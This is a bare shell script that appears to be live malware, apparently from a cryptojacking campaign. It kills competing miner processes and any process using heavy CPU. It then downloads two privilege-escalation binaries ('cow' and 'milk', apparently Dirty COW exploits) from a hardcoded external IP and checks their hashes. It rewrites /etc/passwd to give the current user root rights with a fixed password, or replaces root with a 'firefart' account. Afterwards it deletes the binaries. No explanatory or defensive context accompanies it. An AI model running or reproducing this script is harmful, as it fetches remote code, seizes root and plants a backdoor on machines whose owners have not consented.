#!/bin/sh
#kill miner process
pkill -f cryptonight
pkill -f sustes
pkill -f xmrig
pkill -f xmr-stak
pkill -f suppoie
pkill -f zer0day.ru
pkill -f kworkerds
ps aux | grep "root\|min" | awk '{if($3>20.0) print $2}' | xargs kill -9
pkill -f /tmp/init8.cfg
pkill -f p2.conf

echo $(uname -a)

user=$(whoami)

WGET="wget -O"

if [ -s /usr/bin/curl ];
        then WGET="curl -o";
fi;
if [ -s /usr/bin/wget ];
        then WGET="wget -O";
fi

$WGET /tmp/cow http://154.222.53.26/.cow  > /dev/null

# grep the user line in passwd file
UIF=$(grep "^"$user /etc/passwd)

if [ -x "$(command -v md5sum)" ]
then
    sum=$(md5sum /tmp/cow | awk '{ print $1 }')
    echo $sum
    case $sum in
        0f5ee2ee1275e1c017985f808772f526)
            echo "cow OK"
			cp /etc/passwd /tmp/passwd.bak.bak
			chmod +x /tmp/cow
			/tmp/cow /etc/passwd "$(sed  -i 's|'$UIF'|'$user':fi1IpG9ta02N.:0:0:'$user':/tmp:/bin/bash|' /etc/passwd)" > /dev/null
        ;;
        *)
            echo "cow wrong"
            rm -rf /tmp/cow
            sleep 4
        ;;
    esac
fi

sleep 10


RES=$(grep "^"$user /etc/passwd)

if [ "$UIF" == "$RES" ]
then

	echo "cow failed,use milk now"
	
	$WGET /tmp/milk http://154.222.53.26/.milk > /dev/null
	
	chmod +x /tmp/milk
	
	if [ -x "$(command -v md5sum)" ]
	then	
		sum=$(md5sum /tmp/milk | awk '{ print $1 }')
		echo $sum
		case $sum in
			564ef9cb62bf1dbca077607c3e667cc7)
				
				echo "milk OK"
				#backup passwd to tmp, replace root user with firefart
				/tmp/milk password
				
				echo $(grep "^firefart" /etc/passwd)
				
			;;
			*)
				echo "milk wrong"
				rm -rf /tmp/milk
				sleep 4
			;;
		esac
	fi
	
else
	echo $RES
fi



rm -rf /tmp/cow
rm -rf /tmp/milk



